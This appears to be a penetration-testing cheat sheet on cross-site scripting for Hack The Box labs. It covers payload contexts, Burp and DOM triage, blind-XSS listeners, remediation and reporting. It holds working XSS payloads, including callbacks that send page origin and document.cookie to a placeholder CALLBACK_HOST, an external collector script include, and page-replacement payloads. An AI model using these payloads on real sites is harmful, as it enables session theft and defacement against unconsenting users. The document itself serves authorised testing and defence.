---
title: "Cross-Site Scripting (XSS)"
description: "Reflected/stored/DOM XSS discovery, payloads, filter bypass and blind-XSS callbacks."
category: web
tags: [web, xss, injection]
tools: [Burp Suite]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Web/Cross-Site Scripting (XSS) - HTB Cheat Sheet.md"
---

# Cross-Site Scripting (XSS)

## Summary

Cross-site scripting occurs when attacker-controlled data reaches a browser parsing context without the correct validation, encoding, or sanitisation. The reliable workflow is to locate every input, insert a unique inert marker, identify where and how it is rendered, and only then select a context-matched execution proof. Start with `console.log()` or a visible DOM marker, escalate only as far as the lab objective requires, and capture the exact request, response, execution context, and affected user role.

> **Danger — Authorization Boundary**
> 1. Use these procedures only in Hack The Box, intentionally vulnerable training applications, or systems you own and are explicitly authorised to test.
> 2. Blind-XSS callbacks may collect page data or cookies. Use unique lab-only infrastructure and delete captured data when the exercise ends.
> 3. The page-control demonstration below is temporary and browser-side. Do not use XSS to damage content, persist changes, or disrupt real users.
> 4. XSS executes in a browser. It does not inherently provide an operating-system reverse shell.

---

## Conceptual Information

### XSS Types

| Type | Data path | When execution occurs | First place to inspect |
|---|---|---|---|
| **Reflected XSS** | Current request → immediate response | A crafted request or link is rendered | Query parameters, POST fields, headers, error messages |
| **Stored XSS** | Input → database/log/cache → later response | Another page or user renders the stored value | Comments, profiles, tickets, filenames, audit logs |
| **DOM-based XSS** | Browser-controlled source → unsafe JavaScript sink | Client-side code processes the source | URL fragment, query string, `postMessage`, storage, DOM |
| **Blind XSS** | Stored input → unseen privileged interface | A support agent, administrator, or background browser renders it | Support forms, admin tables, logs, exports, moderation queues |

> **Info — Source, Transform and Sink**
> 1. **Source**: Where attacker-controlled data enters, such as `location.search`, `location.hash`, `document.referrer`, form fields, headers, or stored records.
> 2. **Transform**: Decoding, filtering, template rendering, concatenation, or sanitisation applied before use.
> 3. **Sink**: Where the value is interpreted, such as `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, string-based `setTimeout`, or a dynamic script URL.
> 4. A payload is useful only when it matches the parser and sink that ultimately consume the data.

### Fast Attack Flow

1. **Map inputs** across URL parameters, paths, form fields, JSON, headers, cookies, file metadata, and WebSocket messages.
2. **Insert a unique marker**, such as `xss7q9`, without punctuation.
3. **Find every reflection or stored rendering** in the raw response and the live DOM.
4. **Identify the context** and the characters that are encoded, removed, normalised, or blocked.
5. **Prove execution harmlessly** with `console.log('xss7q9')` or a lab alert.
6. **Validate the affected role and persistence**, especially for stored or blind XSS.
7. **Demonstrate only the minimum required impact** for the objective.
8. **Record evidence and remediation** before removing the test value.

---

## Tools Overview

> **Info — Burp Suite**
> 1. Intercepts browser requests and exposes every parameter, header, and body value.
> 2. Repeater supports controlled, one-change-at-a-time payload testing.
> 3. DOM Invader helps trace browser sources and sinks in client-side code.

> **Info — Browser Developer Tools**
> 1. Elements shows the parsed DOM, which can differ from raw response HTML.
> 2. Sources and breakpoints reveal client-side transforms and dangerous sinks.
> 3. Console provides a low-impact execution proof and displays CSP or syntax errors.

> **Info — XSS Hunter Express**
> 1. Purpose-built blind-XSS collector with page context, screenshots, and callback metadata.
> 2. Best when an unseen administrator or support panel renders stored input.

> **Info — ezXSS**
> 1. Self-hosted blind-XSS platform with payload, notification, and report controls.
> 2. Useful when you want strict lab allowlisting and flexible report handling.

> **Info — Interactsh**
> 1. Lightweight out-of-band interaction service for DNS, HTTP, SMTP, and other callbacks.
> 2. Confirms that an injected resource was resolved or requested, but does not provide a full browser screenshot or DOM report.

---

## Commands and Implementation

### 1. Establish the Reflection Context

Send a unique marker through each input and search both the response and the live DOM.

```http
GET /search?q=xss7q9 HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

> **Info — Request Breakdown**
> 1. `xss7q9`: A unique inert marker that is easy to search and unlikely to collide with page content.
> 2. Raw response: Reveals server-side placement and encoding.
> 3. Live DOM: Reveals browser repair, client-side rendering, and DOM-only reflections.
> 4. Repeat the test in headers such as `User-Agent`, `Referer`, `X-Forwarded-For`, and application-specific metadata when the target contains an admin log viewer.

### 2. Context Identification Matrix

| Observed rendering | Context | Characters to test individually | Harmless execution proof |
|---|---|---|---|
| `<div>xss7q9</div>` | HTML text | `< >` | `<img src=x onerror=console.log('xss7q9')>` |
| `<input value="xss7q9">` | Double-quoted attribute | `" < >` | `"><img src=x onerror=console.log('xss7q9')>` |
| `<input value='xss7q9'>` | Single-quoted attribute | `' < >` | `'><img src=x onerror=console.log('xss7q9')>` |
| `<input value=xss7q9>` | Unquoted attribute | space, tab, `>` | `x autofocus onfocus=console.log('xss7q9')` |
| `<script>let q='xss7q9'</script>` | JavaScript string | `' " \ ;` | `';console.log('xss7q9');//` |
| `` <script>let q=`xss7q9`</script> `` | JavaScript template literal | `` ` ${ } `` | `${console.log('xss7q9')}` |
| `<a href="xss7q9">` | URL-bearing attribute | `: / " '` | `javascript:console.log('xss7q9')` when the lab requires a click |
| `element.innerHTML = source` | DOM HTML sink | Source-dependent | `<img src=x onerror=console.log('xss7q9')>` |

> **Warning — Payload Selection Rule**
> 1. Copying random payloads wastes time because each browser parser has different termination rules.
> 2. Test one character at a time and inspect the resulting HTML or JavaScript before adding an event handler.
> 3. Prefer `console.log()` for initial proof; use `alert()` only when the lab or report specifically expects a visible dialog.

### 3. Progressive Payload Ladder

| Stage | Input | What it proves |
|---|---|---|
| Marker | `xss7q9` | Data reaches the page |
| Metacharacters | `xss7q9<>'"&` | Which characters survive and how they are encoded |
| HTML injection | `<b id=xss7q9>probe</b>` | The browser creates attacker-controlled markup |
| Event execution | `<img src=x onerror=console.log('xss7q9')>` | JavaScript executes without user interaction |
| Visible lab proof | `<img src=x onerror=alert(document.domain)>` | Execution occurs in the target origin |
| Callback proof | `<img src=x onerror="new Image().src='http://CALLBACK_HOST:8000/xss?o='+encodeURIComponent(location.origin)">` | The browser can reach the controlled listener |

### 4. Burp Suite Workflow

1. Configure the browser to proxy through `127.0.0.1:8080`.
2. Capture the request containing the candidate input.
3. Send it to **Repeater** with `Ctrl+R`.
4. Insert `xss7q9`, send the request, and search the response.
5. Add metacharacters one at a time and compare the response using Burp's comparer or Repeater history.
6. Test the smallest payload that matches the observed context.
7. For stored XSS, locate every page and role that later renders the stored value.
8. For DOM XSS, enable **DOM Invader**, reload the page, and inspect reported sources and sinks.
9. Save the final request and response as evidence.

> **Tip — Encoding the Request Correctly**
> 1. URL-encode payloads placed in query strings or form-encoded bodies.
> 2. Preserve JSON quoting and escaping when testing an API body.
> 3. Burp's Inspector can apply or remove URL encoding without changing unrelated request bytes.

### 5. DOM XSS Triage

Search downloaded JavaScript for common sources and sinks:

```bash
rg -n 'location\.(hash|search|href)|document\.(URL|referrer|cookie)|postMessage|localStorage|sessionStorage|innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|setTimeout\(|setInterval\(' ./js
```

> **Info — Command Breakdown**
> 1. Sources: `location`, `document.URL`, `document.referrer`, messages, and browser storage may contain attacker-controlled data.
> 2. HTML sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, and `document.write` can interpret markup.
> 3. Execution sinks: `eval` and string-based timers can interpret JavaScript.
> 4. Trace the value from source through every transform to the sink; a source or sink alone is not proof of exploitability.

### 6. Stored and Blind-XSS Injection Map

| Location | Why it becomes blind | Suggested unique label |
|---|---|---|
| Support/contact ticket | Only staff render the message | `ticket-USER-TIMESTAMP` |
| Display name/profile fields | Admin user lists may render it later | `profile-USER-TIMESTAMP` |
| `User-Agent` or `Referer` | Internal analytics or logs display headers | `ua-USER-TIMESTAMP` |
| `X-Forwarded-For` | Proxy logs or dashboards may trust the value | `xff-USER-TIMESTAMP` |
| Order, address, or invoice fields | Back-office workflows render stored records | `order-USER-TIMESTAMP` |
| Filename or uploaded metadata | File-management panels display names | `file-USER-TIMESTAMP` |
| CSV/PDF/export values | A privileged renderer processes them asynchronously | `export-USER-TIMESTAMP` |

> **Important — Blind Test Discipline**
> 1. Generate a different callback path or subdomain for every field.
> 2. Record the request, account, role, time, and unique correlation label.
> 3. Begin with a resource request that collects no sensitive page data.
> 4. Escalate to DOM or cookie evidence only when the objective requires it.

### 7. Start a Simple HTTP Callback Listener

Use a normal HTTP server when possible because it returns valid responses and records repeat requests cleanly.

```bash
mkdir -p xss-callback
cd xss-callback
python3 -m http.server 8000 --bind 0.0.0.0
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

> **Info — Command Breakdown**
> 1. `8000`: The callback port; expose it only where the target browser can reach it.
> 2. `--bind 0.0.0.0`: Listens on all local interfaces, including the VPN interface.
> 3. Expected log: A successful callback appears as a request such as `GET /xss?o=http%3A...`.
> 4. If the target page uses HTTPS, an HTTP callback may be blocked as mixed content; use a trusted HTTPS collector instead.

### 8. Observe a Raw HTTP Request with Netcat

```bash
nc -lvnp 8000
# listening on [any] 8000 ...
# connect to [CALLBACK_IP] from (UNKNOWN) [LAB_BROWSER_IP] 49152
# GET /xss7q9 HTTP/1.1
# Host: CALLBACK_HOST:8000
# Connection: keep-alive
```

> **Info — Netcat Breakdown**
> 1. `-l`: Listen mode.
> 2. `-v`: Verbose connection information.
> 3. `-n`: Avoid DNS lookups.
> 4. `-p 8000`: Listen on port `8000`.
> 5. This confirms an HTTP connection from the browser. It is not an interactive shell and does not execute operating-system commands.

> **Tip — Return a Valid Response**
> 1. Netcat may leave the browser waiting because it does not automatically send an HTTP response.
> 2. For repeatable tests, prefer `python3 -m http.server`, Interactsh, XSS Hunter, or ezXSS.

### 9. Lab Callback Payloads

Replace `CALLBACK_HOST` and the correlation path before submitting.

```html
<!-- Minimal resource callback: confirms HTML parsing and outbound reachability -->
<img src="https://CALLBACK_HOST/profile-USER-TIMESTAMP">

<!-- JavaScript callback: confirms script execution and reports only the origin -->
<img src=x onerror="new Image().src='https://CALLBACK_HOST/xss?origin='+encodeURIComponent(location.origin)">

<!-- Lab-only cookie demonstration: HttpOnly cookies will not appear -->
<img src=x onerror="new Image().src='https://CALLBACK_HOST/lab-cookie?c='+encodeURIComponent(document.cookie)">

<!-- External collector script supplied by XSS Hunter or ezXSS -->
<script src="https://CALLBACK_HOST/GENERATED_PROBE_PATH"></script>
```

> **Warning — Callback Data Handling**
> 1. A plain `<img src>` proves resource loading but not necessarily JavaScript execution.
> 2. A JavaScript-created request proves execution but may be limited by CSP or mixed-content rules.
> 3. `document.cookie` excludes cookies marked `HttpOnly`; an empty value does not disprove XSS.
> 4. Query strings are stored in shell history, proxy logs, and collector logs. Keep all values lab-only and delete them after use.

### 10. Reversible Page-Control Proof

Use a temporary banner rather than changing server data.

```html
<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<div id=xss-lab-proof style=\"position:fixed;z-index:2147483647;inset:0 0 auto 0;background:#b00;color:#fff;padding:18px;text-align:center;font:700 20px sans-serif\">XSS LAB PROOF — refresh to remove</div>');this.remove()">
```

> **Success — What This Demonstrates**
> 1. The injected script can alter the page presented to the affected browser.
> 2. The change exists only in the current DOM and disappears on refresh unless the payload itself is stored.
> 3. Capture a screenshot, the triggering request, and the affected role; do not replace or destroy application data.

For a lab that explicitly asks for full-page visual control:

```html
<img src=x onerror="document.body.innerHTML='<main style=\"font:700 4vw sans-serif;text-align:center;padding:20vh 2rem\">XSS LAB PROOF<br><small>Refresh to restore the page</small></main>'">
```

> **Danger — Full-Page Proof Boundary**
> 1. Use this only when the objective specifically requires a page-replacement proof.
> 2. It changes the current browser DOM, not the underlying server files.
> 3. Prefer the banner proof because it preserves the page and produces clearer evidence.

---

## What to Watch Out For

### Browser and Application Controls

| Control or symptom | What it means | Next diagnostic step |
|---|---|---|
| `<` becomes `&lt;` | HTML encoding is active in that context | Check other contexts and later DOM transformations |
| Quotes are encoded | Attribute or string breakout may be blocked | Inspect unquoted attributes, URLs, or DOM sinks |
| Payload appears in source but not DOM | Parser repair or client-side rendering changed it | Compare View Source with Elements |
| Payload appears in DOM but does not execute | Wrong event, inert element, CSP, or sanitiser | Check Console, CSP headers, and event conditions |
| External script is blocked | `script-src` or mixed-content policy prevented loading | Use an allowed HTTPS origin or a non-script execution proof |
| `document.cookie` is empty | Cookies may be `HttpOnly`, absent, or path-scoped | Inspect browser storage and cookie attributes |
| Callback receives DNS only | Name resolution occurred, but HTTP may be blocked | Test a simple HTTPS image request and inspect CSP/network logs |
| Callback fires repeatedly | Stored value is rendered by multiple views or refresh jobs | Correlate unique path, timestamps, user agents, and referrers |
| Alert works but external fetch fails | XSS is valid; outbound controls differ | Document execution separately from egress limitations |

### Common Dangerous Sources and Sinks

| Category | Examples |
|---|---|
| URL sources | `location.href`, `location.search`, `location.hash`, `document.URL` |
| Cross-window sources | `postMessage`, `window.name` |
| Storage sources | `localStorage`, `sessionStorage`, IndexedDB values |
| HTML sinks | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` |
| JavaScript sinks | `eval`, `Function`, string-based `setTimeout` and `setInterval` |
| URL/navigation sinks | `location`, `open`, dynamic `script.src`, unsafe `href` values |
| Framework escape hatches | React `dangerouslySetInnerHTML`, Angular trust bypasses, Vue `v-html`, Lit `unsafeHTML` |

---

## Troubleshooting

> **Failure — The Marker Is Not Reflected**
> 1. Check the complete response, redirects, JSON, and asynchronously loaded API calls.
> 2. Submit the value and revisit account, administration, export, notification, and audit pages.
> 3. Test alternate content types and headers visible to back-office tooling.
> 4. Use a unique blind-XSS correlation label and wait for the target's scheduled action.

> **Failure — HTML Is Injected but JavaScript Does Not Run**
> 1. Confirm the element and event exist in the parsed DOM.
> 2. Open the Console for CSP, Trusted Types, mixed-content, and syntax errors.
> 3. Determine whether a sanitiser removed event attributes or changed the element.
> 4. Test `console.log()` in the exact context instead of adding more payload complexity.

> **Failure — Blind Callback Never Arrives**
> 1. Open the generated callback URL yourself to verify DNS, TLS, routing, and collector logs.
> 2. Ensure the target can route to the callback host and that the listener is on the VPN-reachable interface.
> 3. Use HTTPS for an HTTPS target to avoid mixed-content blocking.
> 4. Confirm the stored field is actually rendered by another user or asynchronous process.
> 5. Try a unique `<img src>` callback before an external `<script src>` probe.

---

## Remediation

1. **Encode for the output context**: HTML, HTML attribute, JavaScript, CSS, and URL contexts require different encoders.
2. **Use safe sinks**: Prefer `textContent`, `createTextNode`, hard-coded safe attributes, and framework templating over raw HTML insertion.
3. **Sanitise intentional HTML**: Use a maintained allowlist sanitiser such as DOMPurify and do not mutate the result afterward.
4. **Validate URLs**: Allowlist expected schemes and origins; reject `javascript:` and unsafe `data:` URLs.
5. **Remove dangerous execution**: Avoid `eval`, `Function`, string timers, `document.write`, and unnecessary framework escape hatches.
6. **Deploy CSP as defence in depth**: Use nonces or hashes, avoid `unsafe-inline`, and restrict script origins.
7. **Enable Trusted Types where supported**: Enforce vetted policies for dangerous DOM sinks.
8. **Harden cookies**: Use `HttpOnly`, `Secure`, and appropriate `SameSite` values to reduce impact; cookie flags do not fix XSS.
9. **Test every rendering path**: The same stored value may appear safely in one view and unsafely in an administrator or export view.

---

## Evidence and Reporting Checklist

1. Record the vulnerable URL, method, parameter/header, account, and affected role.
2. Save the original request and the response or storage action.
3. State the exact output context, encoding, source, transform, and sink.
4. Include the smallest reliable proof payload.
5. Capture the Console, DOM, screenshot, and callback metadata where applicable.
6. Distinguish reflected, stored, DOM-based, and blind behaviour.
7. Describe realistic impact without claiming access that was not demonstrated.
8. Provide context-specific remediation and retest evidence.
9. Remove stored test values and delete callback data after the exercise.

---

## Lessons Learned

1. **Context beats payload volume**: A short payload designed for the observed parser is more reliable than a large generic list.
2. **The live DOM is evidence**: Browser parsing and client-side code can create or remove exploitability after the server response arrives.
3. **Blind XSS needs correlation**: Unique callback identifiers connect an unseen execution to the exact field and submission.
4. **Execution and impact are separate claims**: A callback proves browser code execution; cookie access, privileged actions, and OS access require separate evidence.
5. **Defences must be layered**: Contextual encoding and safe sinks address the root cause; sanitisation, CSP, Trusted Types, and cookie flags reduce remaining risk.

---

## References

1. [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
2. [OWASP Web Security Testing Guide — Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
3. [PortSwigger Web Security Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
4. [PortSwigger — Cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
5. [PortSwigger Burp Suite — Testing for XSS](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss)
6. [MDN — Content-Security-Policy `script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
7. [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
8. [ezXSS](https://github.com/ssl/ezXSS)
9. [Interactsh](https://github.com/projectdiscovery/interactsh)
